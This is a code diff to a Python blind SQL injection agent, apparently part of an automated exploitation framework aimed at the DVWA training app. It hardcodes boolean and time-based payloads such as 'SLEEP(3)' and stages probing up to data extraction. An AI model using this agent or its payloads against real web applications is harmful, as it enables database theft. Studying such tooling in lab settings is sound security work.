@@ -2,11 +2,20 @@
 
 from __future__ import annotations
 
+import re
 from typing import Any
 
 from agents.base_agent import BaseAgent
-from agents.state_utils import make_update, module_endpoint, normalize_security_level
+from agents.state_utils import (
+    already_tried_payloads,
+    append_error_marker,
+    make_update,
+    module_endpoint,
+    normalize_security_level,
+    prepare_agent_session,
+)
 from core.state import ExploitationState
+from foundation.http_client import RequestTimeoutError, TransportError
 from foundation.payload_library import PayloadLibrary
 from foundation.session_manager import DVWASession
 from foundation.verifier import Verifier
@@ -19,11 +28,28 @@ class BlindSQLiAgent(BaseAgent):
         self.payloads = PayloadLibrary()
         self.verifier = Verifier()
 
+    @staticmethod
+    def _normalize_boolean_body(body: str) -> str:
+        """Normalize volatile HTML fragments before differential comparison."""
+        normalized = body.lower()
+        normalized = re.sub(
+            r"(name=[\"']user_token[\"'][^>]*value=[\"'])[^\"']+([\"'])",
+            r"\1token\2",
+            normalized,
+        )
+        normalized = re.sub(r"user_token\s*=\s*['\"][^'\"]+['\"]", "user_token=token", normalized)
+        normalized = re.sub(r"phpsessid\s*=\s*[a-z0-9]+", "phpsessid=session", normalized)
+        normalized = re.sub(r"[a-f0-9]{16,}", "hex", normalized)
+        normalized = re.sub(r"\d{5,}", "num", normalized)
+        normalized = re.sub(r"\s+", " ", normalized).strip()
+        return normalized
+
     def run(self, state: ExploitationState) -> dict[str, Any]:
         target_url = state.get("target_url", "")
         level = normalize_security_level(state.get("security_level"))
         endpoint = module_endpoint(state, self.module_name, "/vulnerabilities/sqli_blind/")
         payload_set = self.payloads.get(self.module_name, level)
+        already_tried = already_tried_payloads(state, self.module_name)
 
         score = 0
         confirmed: list[str] = []
@@ -44,24 +70,50 @@ class BlindSQLiAgent(BaseAgent):
 
         session = DVWASession(target_url)
         try:
+            ready, prep_notes = prepare_agent_session(session, level, require_login=True)
+            tried_now.extend(prep_notes)
+            if not ready:
+                return make_update(
+                    state=state,
+                    module_name=self.module_name,
+                    score=score,
+                    tried_payloads=tried_now,
+                )
+
             # Stage 1: boolean differential probe
             boolean_payloads = payload_set.probe[:2]
             if len(boolean_payloads) < 2:
                 boolean_payloads = ["1' AND 1=1-- -", "1' AND 1=2-- -"]
 
-            true_resp = session.get(endpoint, params={"id": boolean_payloads[0], "Submit": "Submit"})
-            false_resp = session.get(endpoint, params={"id": boolean_payloads[1], "Submit": "Submit"})
-            tried_now.extend(boolean_payloads)
+            untried_boolean_payloads = [p for p in boolean_payloads if p not in already_tried]
+            boolean_payloads_to_run = (
+                untried_boolean_payloads if len(untried_boolean_payloads) >= 2 else boolean_payloads
+            )
 
-            if (true_resp.text or "") != (false_resp.text or ""):
+            true_resp = session.get(endpoint, params={"id": boolean_payloads_to_run[0], "Submit": "Submit"})
+            false_resp = session.get(endpoint, params={"id": boolean_payloads_to_run[1], "Submit": "Submit"})
+            for payload in boolean_payloads_to_run:
+                if payload not in already_tried:
+                    tried_now.append(payload)
+
+            true_body = self._normalize_boolean_body(true_resp.text or "")
+            false_body = self._normalize_boolean_body(false_resp.text or "")
+            if true_body != false_body:
                 score = max(score, 1)
                 confirmed.append("blind_sqli_confirmed")
 
             # Stage 2: time-based probe
             sleep_payload = payload_set.exploit[0] if payload_set.exploit else "1' AND SLEEP(3)-- -"
             sleep_resp = session.get(endpoint, params={"id": sleep_payload, "Submit": "Submit"})
-            tried_now.append(sleep_payload)
-            if float(getattr(sleep_resp, "elapsed_ms", 0.0)) > 2500:
+            if sleep_payload not in already_tried:
+                tried_now.append(sleep_payload)
+
+            baseline_ms = (
+                float(getattr(true_resp, "elapsed_ms", 0.0))
+                + float(getattr(false_resp, "elapsed_ms", 0.0))
+            ) / 2.0
+            delay_ms = float(getattr(sleep_resp, "elapsed_ms", 0.0)) - baseline_ms
+            if delay_ms > 2000.0:
                 score = max(score, 2)
 
             # Stage 3: extraction (budget-gated)
@@ -75,7 +127,8 @@ class BlindSQLiAgent(BaseAgent):
                     endpoint,
                     params={"id": extract_payload, "Submit": "Submit"},
                 )
-                tried_now.append(extract_payload)
+                if extract_payload not in already_tried:
+                    tried_now.append(extract_payload)
                 body = extract_resp.text or ""
 
                 if self.verifier.contains_any(body, ["database", "information_schema", "dvwa"]).ok:
@@ -89,8 +142,8 @@ class BlindSQLiAgent(BaseAgent):
                     if "data_exfiltrated" not in confirmed:
                         confirmed.append("data_exfiltrated")
                     outcomes = ["data_exfiltrated"]
-        except Exception:
-            pass
+        except (TransportError, RequestTimeoutError, RuntimeError, ValueError) as exc:
+            append_error_marker(tried_now, "sqli_blind_runtime_error", exc)
         finally:
             session.close()
 
